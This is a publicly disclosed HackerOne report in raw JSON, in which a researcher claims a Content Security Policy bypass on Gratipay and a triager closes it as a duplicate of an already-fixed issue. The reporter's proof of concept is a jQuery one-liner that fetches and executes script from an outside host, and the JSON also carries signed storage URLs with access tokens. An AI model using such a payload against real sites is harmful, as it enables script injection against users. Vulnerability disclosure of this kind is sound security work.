{"id":241192,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDExOTI=","url":"https://hackerone.com/reports/241192","title":"CSP Policy Bypass and javascript execution","state":"Closed","substate":"duplicate","readable_substate":"Duplicate","created_at":"2017-06-18T16:12:36.462Z","submitted_at":"2017-06-18T16:12:36.462Z","is_member_of_team?":false,"reporter":{"disabled":true,"username":"athuljayaram","url":"/athuljayaram","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1868,"url":"https://hackerone.com/gratipay","handle":"gratipay","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Gratipay","twitter_handle":"Gratipay","website":"https://gratipay.com/","about":"Gratitude? Gratipay! The easiest way for your company to pay for open source."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-06-18T17:40:27.286Z","bug_reporter_agreed_on_going_public_at":"2017-06-18T17:40:27.236Z","team_member_agreed_on_going_public_at":"2017-06-18T16:37:00.988Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Content Security Policy (CSP) is a computer security standard introduced to prevent cross-site scripting (XSS), clickjacking and other code injection attacks resulting from execution of malicious content in the trusted web page context. CSP provides a standard method for website owners to declare approved origins of content that browsers should be allowed to load on that website â€” covered types are JavaScript, CSS, HTML frames, web workers, fonts, images, embeddable objects such as Java applets, ActiveX, audio and video files, and other HTML5 features.\n\nContent-Security-Policy-Report-Only: default-src 'self';script-src 'self' assets.gratipay.com 'unsafe-inline';style-src 'self' assets.gratipay.com downloads.gratipay.com cloud.typography.com;img-src *;font-src 'self' assets.gratipay.com cloud.typography.com data:;block-all-mixed-content;report-uri https://gratipay.report-uri.io/r/default/csp/reportOnly;\n\n\nin that their is also a report-uri which sends a report on CSP Violation  as POST in case of CSP violation to \nhttps://gratipay.report-uri.io/r/default/csp/reportOnly;\n\n\nI have a captured CSP post request in case of violation\n\nPUT /r/default/csp/reportOnly HTTP/1.1\nHost: gratipay.report-uri.io\nConnection: close\nContent-Length: 738\nOrigin: https://gratipay.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.24 Safari/537.36\nContent-Type: application/csp-report\nAccept: */*\nDNT: 1\nReferer: https://gratipay.com/about/pricing\nAccept-Language: en-GB,en-US;q=0.8,en;q=0.6\n\n{\"csp-report\":{\"document-uri\":\"https://gratipay.com/about/pricing\",\"referrer\":\"https://gratipay.com/about/\",\"violated-directive\":\"connect-src\",\"effective-directive\":\"connect-src\",\"original-policy\":\"default-src 'self';script-src 'self' assets.gratipay.com 'unsafe-inline';style-src 'self' assets.gratipay.com downloads.gratipay.com cloud.typography.com;img-src *;font-src 'self' assets.gratipay.com cloud.typography.com data:;block-all-mixed-content;report-uri https://gratipay.report-uri.io/r/default/csp/reportOnly;\",\"disposition\":\"report\",\"blocked-uri\":\"https://sakurity.com/\",\"line-number\":8,\"column-number\":26577,\"source-file\":\"https://assets.gratipay.com/vendors.js?etag=rTtsoO9IGH-cTRpSMarMHQ~~\",\"status-code\":0,\"script-sample\":\"\"}}\n\n\n\n\nI like to use $.get('https://sakurity.com/jqueryxss'); as input to show the CSP policy bypass\n\nby using $.get('https://sakurity.com/jqueryxss'); I was able to bypass allowed CSP policy though https://sakurity.com is not allowed an approved origin of content, still I am able to fetch it and it didn't issue a POST request (report-uri attribute of CSP) which sends a report in case of any CSP violation ,\n\n\nSo using $.get request \nit didn't send a CSP report \nit read the remote content and executed the javascript\n\n\n\n\n\nSOLUTION\nUpdate your javascript libraries mainly jquery  elements to the latest version\n\n","original_report_id":null,"original_report_url":null,"attachments":[{"id":195246,"file_name":"gratipay_com.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/195/246/268cbeeb24fbc8b4a83acc14aa5b2b3d71f0e80f/gratipay_com.png?response-content-disposition=attachment%3B%20filename%3D%22gratipay_com.png%22%3B%20filename%2A%3DUTF-8%27%27gratipay_com.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2T6DG5UU%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T141200Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQCyGt%2F6wKTb7WdhbTEehok3geSSNypgF1jy9glhzjfqmQIhAN%2FZ96OUsxT3l%2FcNh%2BJaiqKBQp%2B0XefuAf%2BhfC%2FmhMZBKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxZblqGtDqM2dUzvNgq1wMBRL4HwjcRdARKHRTYG1WTOwsUnNm5pyWIDl6UX7cxu3S9pxhLAGamITa%2Bry536DE0dNafGhdIyPeponbLp8FxjTVDEDmVrSlc3vq07ilX%2FsvaFMPbfLwUFwN8DcJVAZSLYZA6zDdeKNCgrZ1ISy%2BuSl%2F8sa9Nj%2FKFffdAxrEzWdcbmnUnTxt6PFvOqigHySvKHcRU1WUlzR%2BJNQhShWoYk3WMwt3lGEOyDeyEBa1PjWzXfwU5hwfOCygWSHeqe3rws%2Fy%2FAjcJ4Igs3dp7VWi2gpey9dMnBlv29eq43WYKyQ6K0q%2FC9l73EFZqlsoZAnNWCF%2BaMWp%2FSNCQCoi6LiyTT3H7xbPsVAE%2F%2B6%2B%2Fmd5o4HWlwOrPWTPapPHw%2BSF0OGtEIdy9BSNcjjpsTprmH3CxZWrOiVUBzDRDrImWT3QqtKWRETxE5UkMEesELPvS1Vr78fUKmIPG33W64ks49siCJg%2BYlvii52MslCAhwi8OBai4EvmsepnSL4Y7WjbGc31Zh7uWP1tOMXaSXgoK4ZXpbX9aNZgfinEq%2FEdjmz1acLqkVL8LTALuORrCaSQNzbL1VsrMHnDQY5Ip6UHG9W3WhTLOB2rMmAx%2FYtqF%2F2HrLRQRuA5lXPow%2F4aRiwY6pAFiuHIrJ99Gk48YedhIWLylCmpLudXTrjRTQ5%2BPJgz8sHy%2FJL%2BbYgchWh7RyeRvXCGWkecfBiAUWkHftxJlLxZP3R4oliu1hG1pnP80N0SBXLpKCFAQqqhncEnNPuXaqUaPMjKqpRRMw76WlTCCpu34SiacreJDZDO6dLymqMm3OX1OpD5Y13L2IbUTLcllZFway4EkA3FPk2PKaxAARwJYsWedpQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=809ddf2c3433f6fb18a4eabd74e1302bc55054df766816d44866a35f939727c5","file_size":70246,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":4,"voters":["eveeez","b7de13fb79e2483638f04b8","sumit7","juniorhero"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1764021,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nThank you for your report, the receipt of which we herewith confirm. We are currently verifying the issue you reported.\n\nPlease expect additional feedback from us within the next couple of days. The \"INFORMATION SECURITY\" section of the following page has additional, useful information regarding our platform's security: http://inside.gratipay.com/howto/manage-risk\n\nWe appreciate your interest in securing our platform and look forward to working with you.\n\nYours sincerely,\nThe Gratipay Security Team","automated_response":true,"created_at":"2017-06-18T16:12:36.605Z","updated_at":"2017-06-18T16:12:36.605Z","actor":{"url":"/gratipay","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Gratipay"}},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1764037,"is_internal":false,"editable":false,"type":"Activities::BugDuplicate","message":"Hi @athuljayaram,\n\nThanks for the report. Unfortunately, this has already been reported to us and we are working on a [fix](https://github.com/gratipay/gratipay.com/pull/4377). We look forward to more reports from you in the future.\n\nBest regards,\nEd","automated_response":false,"created_at":"2017-06-18T16:36:54.464Z","updated_at":"2017-06-18T16:36:54.464Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1764038,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-06-18T16:37:01.007Z","updated_at":"2017-06-18T16:37:01.007Z","first_to_agree":true,"actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1764042,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ok, I didn't know that\n\nIt can cause self-xss too\n\nIt would be nice of you if you can thank me on hackerone\n\nI had put a lot of effort in identifying this vulnerability\n","automated_response":false,"created_at":"2017-06-18T16:55:31.208Z","updated_at":"2017-06-18T16:55:31.208Z","actor":{"username":"athuljayaram","cleared":false,"url":"/athuljayaram","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1764084,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-06-18T17:40:27.255Z","updated_at":"2017-06-18T17:40:27.255Z","actor":{"username":"athuljayaram","cleared":false,"url":"/athuljayaram","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1764085,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-06-18T17:40:27.303Z","updated_at":"2017-06-18T17:40:27.303Z","actor":{"username":"athuljayaram","cleared":false,"url":"/athuljayaram","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1765041,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @athuljayaram,\n\nIn order to really exploit this issue, you need to find one of these two scenarios:\n\n1. Any cross domain requests to untrusted domains which may inadvertently execute script.\n2. Any requests to trusted API endpoints where script can be injected into data sources.\n\nIf you can demonstrate an XSS vulnerability with a thorough PoC we will reward you accordingly.\n\n\u003e It would be nice of you if you can thank me on hackerone\n\nYou are on our \"[Disclosures](http://inside.gratipay.com/appendices/disclosures)\" page. :)\n\nWe look forward to more reports from you in the future.\n\nBest regards,\nEd","automated_response":false,"created_at":"2017-06-19T12:25:08.873Z","updated_at":"2017-06-19T12:25:08.873Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1766014,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello edio\n\nI have clearly shown it can send cross domain requests to untrusted domains which may inadvertently execute script.\n\nExecute it in console\n\n $.get('https://sakurity.com/jqueryxss'); \n\n\n\n","automated_response":false,"created_at":"2017-06-19T18:34:10.841Z","updated_at":"2017-06-19T18:34:10.841Z","actor":{"username":"athuljayaram","cleared":false,"url":"/athuljayaram","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1766015,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"$.get('https://sakurity.com/jqueryxss');\n\nIt can execute XSS","automated_response":false,"created_at":"2017-06-19T18:34:36.963Z","updated_at":"2017-06-19T18:34:36.963Z","actor":{"username":"athuljayaram","cleared":false,"url":"/athuljayaram","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1766110,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"You also categorised this issue as duplicate...kindly tell me this is duplicate to what?\n \nthis is an original issue and even if u include script-src in the content security policy or not\n\nit will still execute\n\n","automated_response":false,"created_at":"2017-06-19T19:00:43.973Z","updated_at":"2017-06-19T19:00:43.973Z","actor":{"username":"athuljayaram","cleared":false,"url":"/athuljayaram","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1770723,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @athuljayaram,\n\nThe duplicate report is located over at #211149 and there is already a [PR](https://github.com/gratipay/gratipay.com/pull/4377) in queue for this issue.\n\nThe beauty of [Egor Homakov](https://twitter.com/homakov)'s discovery is the fact that one can really exploit this issue without pasting anything into the console. All you need to do is find one of the two scenarios I have listed above. \n\nOn a side note, we also discourage users from pasting anything into the console with the following message:\n\n{F196025}\n\nBest regards,\nEd","automated_response":false,"created_at":"2017-06-21T09:05:01.578Z","updated_at":"2017-06-21T09:05:24.779Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":196025,"filename":"gratipay_console.PNG","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/196/025/b1689add7f8d909c3f498c5f86e09b6f997d30da/gratipay_console.PNG?response-content-disposition=attachment%3B%20filename%3D%22gratipay_console.PNG%22%3B%20filename%2A%3DUTF-8%27%27gratipay_console.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2T6DG5UU%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T141200Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQCyGt%2F6wKTb7WdhbTEehok3geSSNypgF1jy9glhzjfqmQIhAN%2FZ96OUsxT3l%2FcNh%2BJaiqKBQp%2B0XefuAf%2BhfC%2FmhMZBKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxZblqGtDqM2dUzvNgq1wMBRL4HwjcRdARKHRTYG1WTOwsUnNm5pyWIDl6UX7cxu3S9pxhLAGamITa%2Bry536DE0dNafGhdIyPeponbLp8FxjTVDEDmVrSlc3vq07ilX%2FsvaFMPbfLwUFwN8DcJVAZSLYZA6zDdeKNCgrZ1ISy%2BuSl%2F8sa9Nj%2FKFffdAxrEzWdcbmnUnTxt6PFvOqigHySvKHcRU1WUlzR%2BJNQhShWoYk3WMwt3lGEOyDeyEBa1PjWzXfwU5hwfOCygWSHeqe3rws%2Fy%2FAjcJ4Igs3dp7VWi2gpey9dMnBlv29eq43WYKyQ6K0q%2FC9l73EFZqlsoZAnNWCF%2BaMWp%2FSNCQCoi6LiyTT3H7xbPsVAE%2F%2B6%2B%2Fmd5o4HWlwOrPWTPapPHw%2BSF0OGtEIdy9BSNcjjpsTprmH3CxZWrOiVUBzDRDrImWT3QqtKWRETxE5UkMEesELPvS1Vr78fUKmIPG33W64ks49siCJg%2BYlvii52MslCAhwi8OBai4EvmsepnSL4Y7WjbGc31Zh7uWP1tOMXaSXgoK4ZXpbX9aNZgfinEq%2FEdjmz1acLqkVL8LTALuORrCaSQNzbL1VsrMHnDQY5Ip6UHG9W3WhTLOB2rMmAx%2FYtqF%2F2HrLRQRuA5lXPow%2F4aRiwY6pAFiuHIrJ99Gk48YedhIWLylCmpLudXTrjRTQ5%2BPJgz8sHy%2FJL%2BbYgchWh7RyeRvXCGWkecfBiAUWkHftxJlLxZP3R4oliu1hG1pnP80N0SBXLpKCFAQqqhncEnNPuXaqUaPMjKqpRRMw76WlTCCpu34SiacreJDZDO6dLymqMm3OX1OpD5Y13L2IbUTLcllZFway4EkA3FPk2PKaxAARwJYsWedpQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=e2d286cbb20d1784ca5dd9ad8701877ebcc938ac7acdef26a8feed375c852873"}],"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}